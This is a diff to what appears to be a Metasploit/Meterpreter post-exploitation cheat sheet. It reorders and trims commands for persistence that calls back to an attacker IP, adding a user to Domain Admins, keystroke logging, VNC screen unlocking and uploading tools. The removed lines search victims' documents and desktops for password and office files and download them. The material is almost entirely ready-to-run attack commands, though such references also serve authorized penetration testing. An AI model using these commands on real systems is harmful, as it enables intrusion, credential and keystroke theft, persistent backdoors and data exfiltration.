@@ -176,6 +176,10 @@ use/post/windows/gather/credentials/domain_hashdump
 
 # Persistance
 
+add_user <user> <password> -h <target IP>
+add_group_user "Domain Admins" <user> -h <target IP>
+------------------------------------------------
+
 run persistence -h
 
 run persistence <starts at computer startup> <tries to connect every 30s> <port 443> <attacker IP>
@@ -368,30 +372,17 @@ workspace -r <old> <new>      Rename workspace.
 
 # Misc
 
-screenshot                                    Grab a screenshot of the interactive desktop
-
 idletime                                      Returns the number of seconds the remote user has been idle.
      if time < 5 min
      keyscan_start                            Start capturing keystrokes.
      keyscan_stop                             Stop capturing keystrokes.
      keyscan_dump                             Dump the keystroke buffer.
 
+screenshot                                    Grab a screenshot of the interactive desktop
+
 run vnc
      if the screen is locked exit VNC
      run screen_unlock
 
-add_user hacker password -h <target IP>
-add_group_user "Domain Admins" hacker -h <target IP>
-
 upload <local path> <remote path>
 upload /root/putty.exe c:\\
-
-# Find and download files
-run search_dwld "%USERPROFILE%\\my documents" passwd
-run search_dwld "%USERPROFILE%\\desktop passwd
-run search_dwld "%USERPROFILE%\\my documents" office 
-run search_dwld "%USERPROFILE%\\desktop" office
-
-# Alternate 
-download -r "%USERPROFILE%\\desktop"  ~/
-download -r "%USERPROFILE%\\my documents"  ~/
